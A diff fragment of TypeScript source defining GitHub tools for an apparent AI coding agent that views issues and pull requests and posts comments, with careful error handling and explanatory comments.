+        const target = await forgeRepo(dir);
+        if ("refusal" in target) return target.refusal;
+        const { owner, repo } = target;
+
+        // The issues endpoint, deliberately, even for a pull request: GitHub
+        // models every PR as an issue, and this is the one that carries the
+        // discussion. `repo_pr_view` is for the parts that are only a PR's.
+        const issue = await forge(
+          "repo_issue_view",
+          `/repos/${owner}/${repo}/issues/${number}`
+        );
+        if (!issue.ok) return bounded(issue.message);
+        const data = issue.data as {
+          title?: string;
+          state?: string;
+          user?: { login?: string };
+          body?: string;
+          pull_request?: unknown;
+        };
+
+        const comments = await forge(
+          "repo_issue_view",
+          `/repos/${owner}/${repo}/issues/${number}/comments`
+        );
+        // A failure here is not a failure of the tool: the issue itself was
+        // read, and half an answer beats none.
+        const thread = (
+          comments.ok && Array.isArray(comments.data) ? comments.data : []
+        ) as { user?: { login?: string }; body?: string }[];
+
+        return bounded(
+          [
+            `#${number} ${data.title ?? "(no title)"} [${data.state ?? "?"}]` +
+              (data.pull_request ? " (pull request)" : ""),
+            `opened by ${data.user?.login ?? "unknown"}`,
+            "",
+            data.body?.trim() || "(no description)",
+            ...thread.map(
+              (c) =>
+                `\n--- ${c.user?.login ?? "unknown"} ---\n${c.body?.trim() ?? ""}`
+            ),
+            ...(comments.ok ? [] : [`\n(comments could not be read)`])
+          ].join("\n")
+        );
+      }
+    }),
+
+    repo_pr_view: tool({
+      description:
+        "Read a pull request's state and the files it touches — whether it is mergeable, its review state, and which paths changed. Use this to check on a pull request you opened, or to see what an existing one does before duplicating it.",
+      inputSchema: z.object({
+        dir: z.string().describe("The checkout directory"),
+        number: z.number().int().positive().describe("Pull request number")
+      }),
+      execute: async ({ dir, number }) => {
+        const target = await forgeRepo(dir);
+        if ("refusal" in target) return target.refusal;
+        const { owner, repo } = target;
+
+        const pr = await forge(
+          "repo_pr_view",
+          `/repos/${owner}/${repo}/pulls/${number}`
+        );
+        if (!pr.ok) return bounded(pr.message);
+        const data = pr.data as {
+          title?: string;
+          state?: string;
+          draft?: boolean;
+          merged?: boolean;
+          mergeable?: boolean | null;
+          head?: { ref?: string };
+          base?: { ref?: string };
+          html_url?: string;
+        };
+
+        const files = await forge(
+          "repo_pr_view",
+          `/repos/${owner}/${repo}/pulls/${number}/files`
+        );
+        const changed = (
+          files.ok && Array.isArray(files.data) ? files.data : []
+        ) as { filename?: string; additions?: number; deletions?: number }[];
+
+        return bounded(
+          [
+            `#${number} ${data.title ?? "(no title)"}`,
+            `${data.merged ? "merged" : (data.state ?? "?")}` +
+              (data.draft ? " (draft)" : "") +
+              // `mergeable` is computed asynchronously by GitHub and is `null`
+              // until it has been, which is common on a pull request opened
+              // seconds ago — exactly when this tool is most likely to be called.
+              (data.mergeable === null
+                ? ", mergeability not yet computed"
+                : data.mergeable === false
+                  ? ", NOT mergeable"
+                  : ""),
+            `${data.head?.ref ?? "?"} → ${data.base?.ref ?? "?"}`,
+            data.html_url ?? "",
+            "",
+            changed.length
+              ? changed
+                  .map(
+                    (f) =>
+                      `  ${f.filename ?? "?"} (+${f.additions ?? 0} -${f.deletions ?? 0})`
+                  )
+                  .join("\n")
+              : files.ok
+                ? "  (no files reported)"
+                : "  (changed files could not be read)"
+          ].join("\n")
+        );
+      }
+    }),
+
+    repo_pr_comment: tool({
+      description:
+        "Leave a comment on a pull request or issue in the repository you have checked out. Use this to report what you did, or to answer a review — not to announce work you have not finished.",
+      inputSchema: z.object({
+        dir: z.string().describe("The checkout directory"),
+        number: z
+          .number()
+          .int()
+          .positive()
+          .describe("Pull request or issue number"),
+        body: z.string().describe("The comment, as markdown")
+      }),
+      execute: async ({ dir, number, body }) => {
+        const target = await forgeRepo(dir);
+        if ("refusal" in target) return target.refusal;
+        const { owner, repo } = target;
+
+        const posted = await forge(
+          "repo_pr_comment",
+          `/repos/${owner}/${repo}/issues/${number}/comments`,
+          { method: "POST", body: { body } }
+        );
+        if (!posted.ok)
+          // The same hazard `repo_open_pr` names, for the same reason: a POST
+          // whose answer never arrived may still have been received, and a blind
+          // retry is how one comment becomes two.
+          return bounded(
+            `${posted.message}\nIf this was a timeout rather than a rejection the ` +
+              `comment may exist anyway — read it back with repo_issue_view before retrying.`
+          );
+        const data = posted.data as { html_url?: string };
+        return data.html_url ?? `commented on #${number}`;
       }
     })
   };
